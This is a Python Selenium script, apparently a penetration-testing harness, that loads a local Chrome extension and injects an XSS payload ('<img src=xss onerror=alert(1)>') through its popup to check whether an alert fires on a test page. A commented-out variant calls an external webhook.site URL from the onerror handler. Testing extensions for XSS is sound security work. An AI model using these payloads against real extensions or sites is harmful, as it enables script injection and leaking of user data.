import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from os import path
import hashlib

import logging

def logs(driver, alert):
    # Take a screenshot of the alert
    driver.save_screenshot("alert_screenshot.png")

    alert_text = alert.text
    alert.accept() #accept the alert window

    # log the info
    logging.critical(f"Alert Message Executed Sussessfully: {alert_text}")




def gui():
    # getting id of extension [start]
    def get_ext_id(path_to_extension):
        abs_path = path.abspath(path_to_extension)
        m = hashlib.sha256()
        m.update(abs_path.encode("utf-8"))
        ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
        url_path = f"chrome-extension://{ext_id}/popup.html"
        return url_path, abs_path

    url_path, abs_path = get_ext_id('Extensions/h1-replacer/h1-replacer_P')

    options = webdriver.ChromeOptions()
    # prevent chrome browser from closing and define extension
    options.add_experimental_option('detach', True)
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)
    options.add_argument("--enable-logging")
    driver = webdriver.Chrome('./chromedriver', options=options)


    driver.get(url_path)
    original = driver.current_window_handle
    driver.switch_to.new_window('tab')
    new = driver.current_window_handle


    driver.get('https://www.example.com')
    driver.switch_to.window(original)


    # sending input and clicking buttons
    a = driver.find_element(By.ID,'replacementInput')
    # payload = '<img src=x onerror="window.open(`https://webhook.site/addca2be-52c9-4cee-8589-408277a63dda`)">'
    payload = '<img src=xss onerror=alert(1)>'
    a.send_keys(payload)
    button = driver.find_element(By.ID, 'replaceButton')
    button.click()

    driver.switch_to.window(new)

    try:
        print('+ Alert Detected +')
        WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        logs(driver, alert)
    except:
        print('= No alerts detected =')





    # print soruce code
    # print(driver.page_source)





def main():
    # Configure logging
    logging.basicConfig(
        filename='penetration_testing.txt',
        level=logging.CRITICAL,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

    # run program
    gui()

if __name__ == '__main__':
    main()